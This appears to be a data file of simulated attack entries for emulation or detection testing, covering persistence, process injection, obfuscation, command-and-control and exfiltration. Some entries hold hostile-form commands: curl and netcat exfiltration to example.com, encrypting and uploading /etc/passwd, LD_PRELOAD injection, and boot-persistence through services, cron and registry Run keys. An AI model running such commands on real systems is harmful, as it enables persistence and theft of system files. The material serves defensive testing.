attacks.description: Starts Notepad using PowerShell, demonstrating process creation.
attacks.expected_behavior: Notepad opens with the specified path argument.

attacks.command: sc.exe create TestService binPath= "C:\Windows\System32\notepad.exe" start= auto
attacks.description: Creates a new service that starts Notepad on boot, demonstrating process creation via a service.
attacks.expected_behavior: A new service named 'TestService' is created, starting Notepad on system boot.

attacks.description: Uses CMD to start Notepad, redirecting output to suppress it.
attacks.expected_behavior: Notepad opens without displaying command output.

attacks.command: sudo touch /etc/init.d/test_service && sudo chmod +x /etc/init.d/test_service && echo '#!/bin/sh\n/bin/echo "Test Service Running"' | sudo tee /etc/init.d/test_service && sudo update-rc.d test_service defaults
attacks.description: Creates a new system service script and enables it to start on boot.
attacks.expected_behavior: The command creates a benign service script that echoes a test message. It requires root privileges to modify system directories and enable the service.

attacks.command: echo '#!/bin/bash\n/bin/echo "Test Process Running"' | sudo tee /usr/local/bin/test_process.sh && sudo chmod +x /usr/local/bin/test_process.sh && sudo /usr/local/bin/test_process.sh &
attacks.description: Creates a script that runs a benign process in the background.
attacks.expected_behavior: The command creates a script that starts a benign process in the background. It requires root privileges to place the script in a system directory and execute it.

attacks.command: sudo crontab -l | { cat; echo '@reboot /bin/echo "Test Cron Job"'; } | sudo crontab -
attacks.description: Adds a cron job to execute a benign command at system reboot.
attacks.expected_behavior: The command adds a cron job that echoes a test message at system reboot. It requires root privileges to modify the crontab.

attacks.description: Basic PowerShell command to inject a benign string into a running Notepad process.
attacks.expected_behavior: Notepad opens with 'TestString' as an argument, demonstrating process injection.

attacks.description: Intermediate command using certutil to encode and decode a benign string for process injection into Notepad.
attacks.expected_behavior: Notepad opens with the decoded string from test_inject.txt, demonstrating process injection.

attacks.description: Advanced command using encoded PowerShell commands to inject a benign string into Notepad.
attacks.expected_behavior: Notepad opens with 'Test Run For Demo' as an argument, demonstrating process injection.

attacks.description: Basic example of using LD_PRELOAD to inject a shared library into a process.
attacks.expected_behavior: The /bin/ls command is executed with the LD_PRELOAD environment variable set to a benign shared library, demonstrating process injection.

attacks.command: echo 'int __attribute__((constructor)) injected() { return 0; }' > /tmp/benign.c && gcc -shared -fPIC /tmp/benign.c -o /tmp/libbenign.so && sudo LD_PRELOAD=/tmp/libbenign.so /usr/bin/top
attacks.description: Intermediate example using LD_PRELOAD with a constructor attribute to inject code into /usr/bin/top.
attacks.expected_behavior: The /usr/bin/top command is executed with the LD_PRELOAD environment variable set to a benign shared library, demonstrating process injection.

attacks.command: sudo bash -c 'echo "int main() { return 0; }" > /tmp/benign.c && gcc -shared -fPIC /tmp/benign.c -o /tmp/libbenign.so && ptrace -l -f -o /tmp/libbenign.so /bin/bash'
attacks.description: Advanced example using ptrace to inject a shared library into a new bash process.
attacks.expected_behavior: A new bash process is started with ptrace to inject a benign shared library, demonstrating process injection.

attacks.description: Basic command to simulate network activity using the net.exe utility.
attacks.expected_behavior: Lists network resources on the local machine.

attacks.description: Intermediate command using certutil.exe to simulate downloading a file, demonstrating Application Layer Protocol activity.
attacks.expected_behavior: Downloads a file from a local HTTP server to the temp directory.

attacks.description: Advanced command using PowerShell to start a process and write to a file, simulating command execution.
attacks.expected_behavior: Creates a text file in the temp directory with the content 'Test'.

attacks.description: Basic command using netcat to establish a reverse shell connection to an attacker-controlled server.
attacks.expected_behavior: Establishes a reverse shell connection to attacker.com on port 4444.

attacks.description: Intermediate command using openssl to encrypt traffic before establishing a reverse shell connection.
attacks.expected_behavior: Encrypts traffic using openssl and then establishes a reverse shell connection on port 4444.

attacks.description: Advanced command using netcat and curl to tunnel traffic through an HTTP proxy.
attacks.expected_behavior: Tunnels traffic received on port 8080 through an HTTP POST request to attacker.com.

attacks.description: Encodes a text file using Base64 to obfuscate its contents.
attacks.expected_behavior: Creates a Base64 encoded file from a text file in the TEMP directory.

attacks.description: Creates a text file and compresses it into a ZIP archive to obfuscate its contents.
attacks.expected_behavior: Generates a ZIP file containing a text file in the TEMP directory.

attacks.description: Executes an obfuscated PowerShell command using Base64 encoding.
attacks.expected_behavior: Creates a text file in the TEMP directory with the content 'test' using an encoded command.

attacks.description: Basic obfuscation using base64 encoding of a string and saving it to a file.
attacks.expected_behavior: Creates a file in the temporary directory with base64 encoded content.

attacks.description: Intermediate obfuscation by double encoding and decoding a string before re-encoding it.
attacks.expected_behavior: Creates a file with double-encoded content, demonstrating more complex obfuscation.

attacks.description: Advanced obfuscation by encoding, decoding, and re-encoding a string, then decoding it back to a file.
attacks.expected_behavior: Creates two files, one with double-encoded content and another with the original content, demonstrating reversible obfuscation.

attacks.description: Basic command to encode a benign file using certutil.exe, simulating data exfiltration.
attacks.expected_behavior: Creates an encoded version of a benign text file in the TEMP directory.

attacks.description: Intermediate command using PowerShell to start a process that encodes a file with certutil.exe.
attacks.expected_behavior: Executes a command to encode a benign text file using certutil.exe via PowerShell.

attacks.description: Advanced command that encodes a string into Base64, writes it to a file, and then encodes the file using certutil.exe.
attacks.expected_behavior: Generates a Base64 encoded string, writes it to a file, and then encodes the file using certutil.exe.

attacks.command: echo 'Test data for exfiltration' | curl -s -X POST http://example.com/upload --data-binary @- > /dev/null 2>&1
attacks.description: Basic command to exfiltrate test data using curl.
attacks.expected_behavior: Sends 'Test data for exfiltration' to the specified URL using curl. Output is discarded.

attacks.command: echo 'Test data for exfiltration' | nc -w 3 example.com 80 > /dev/null 2>&1
attacks.description: Intermediate command to exfiltrate test data using netcat.
attacks.expected_behavior: Sends 'Test data for exfiltration' to the specified host and port using netcat. Output is discarded.

attacks.command: cat /etc/passwd | base64 | openssl enc -e -aes-256-cbc -pass pass:password | curl -s -X POST http://example.com/upload --data-binary @- > /dev/null 2>&1
attacks.description: Advanced command to exfiltrate system data (e.g., /etc/passwd) using curl and OpenSSL.
attacks.expected_behavior: Encodes and encrypts /etc/passwd, then sends it to the specified URL using curl. Output is discarded.

attacks.description: Basic command to download a file from a public-facing application using certutil.exe.
attacks.expected_behavior: Downloads a test file from a specified URL to the temporary directory.

attacks.description: Intermediate command using PowerShell to execute a command that writes to a file, simulating exploitation.
attacks.expected_behavior: Creates a text file in the temporary directory with the content 'Test'.

attacks.description: Advanced command to download and execute a PowerShell script, simulating a more complex exploit.
attacks.expected_behavior: Downloads a PowerShell script and executes it, demonstrating potential exploitation through script execution.

attacks.description: Basic command to simulate exploiting a public-facing application by downloading and executing a script.
attacks.expected_behavior: Downloads and executes a script from a public URL, simulating an exploit.

attacks.description: Intermediate command using wget to fetch and execute a script from a public-facing application.
attacks.expected_behavior: Fetches and executes a script using wget, simulating an exploit.

attacks.description: Advanced command that downloads a script, changes its permissions, and executes it, simulating a more complex exploit.
attacks.expected_behavior: Downloads a script, changes permissions, and executes it, simulating a complex exploit.

attacks.description: Basic command to collect data from a text file and archive it using PowerShell.
attacks.expected_behavior: Creates a zip archive of the specified text file in the TEMP directory.

attacks.description: Intermediate command to collect all text files in the TEMP directory and archive them.
attacks.expected_behavior: Archives all text files in the TEMP directory into a single zip file.

attacks.command: powershell -Command "Get-Process | Select-Object Name, Id | Out-File $env:TEMP\process_list.txt; Compress-Archive -Path $env:TEMP\process_list.txt -DestinationPath $env:TEMP\process_list.zip -Force"
attacks.description: Advanced command to collect process information and archive it.
attacks.expected_behavior: Creates a text file with process information and archives it in the TEMP directory.

attacks.description: Creates a tar archive of a test file in the Downloads directory.
attacks.expected_behavior: A tar archive named 'test_data.tar' is created in the Downloads directory containing 'testfile.txt'.

attacks.description: Creates a zip archive of a test file in the Downloads directory.
attacks.expected_behavior: A zip archive named 'test_data.zip' is created in the Downloads directory containing 'testfile.txt'.

attacks.description: Creates a compressed tar archive of a test file in the Downloads directory.
attacks.expected_behavior: A compressed tar archive named 'test_data_compressed.tar.gz' is created in the Downloads directory containing 'testfile.txt'.

attacks.command: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v TestApp /t REG_SZ /d "powershell -Command "'Write-Host Hello World'"" /f
attacks.description: Basic command to add a registry run key using reg.exe. This command adds a registry entry under the current user's Run keys to execute a PowerShell command at startup.
attacks.expected_behavior: The command will add a registry entry that runs a benign PowerShell command at user login, displaying 'Hello World'.

attacks.description: Intermediate command using PowerShell to add a registry run key under the Local Machine hive. This requires administrative privileges.
attacks.expected_behavior: The command will add a registry entry under the Local Machine hive, executing a benign PowerShell command at system startup, displaying 'Hello World'.

attacks.command: powershell -Command "$regPath = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'; $name = 'TestApp'; $value = '"powershell -Command "'Write-Host Hello World'""'; if (-Not (Test-Path $regPath)) { New-Item -Path $regPath -Force }; New-ItemProperty -Path $regPath -Name $name -Value $value -PropertyType String -Force"
attacks.description: Advanced command using PowerShell to ensure the registry path exists before adding a run key. This command also requires administrative privileges.
attacks.expected_behavior: The command will check for the existence of the registry path, create it if necessary, and then add a registry entry to execute a benign PowerShell command at system startup, displaying 'Hello World'.

attacks.description: Basic command to create a script in /etc/profile.d that runs at login.
attacks.expected_behavior: The script 'hello.sh' is created in /etc/profile.d and will print 'Hello, World!' on user login.

attacks.description: Intermediate command to create a daily cron job that writes to /tmp/hello.log.
attacks.expected_behavior: A daily cron job is created that appends 'Hello, World!' to /tmp/hello.log.

attacks.description: Advanced command to create an rc.local script that runs at boot.
attacks.expected_behavior: An rc.local script is created that appends 'Hello, World!' to /tmp/hello.log at boot.
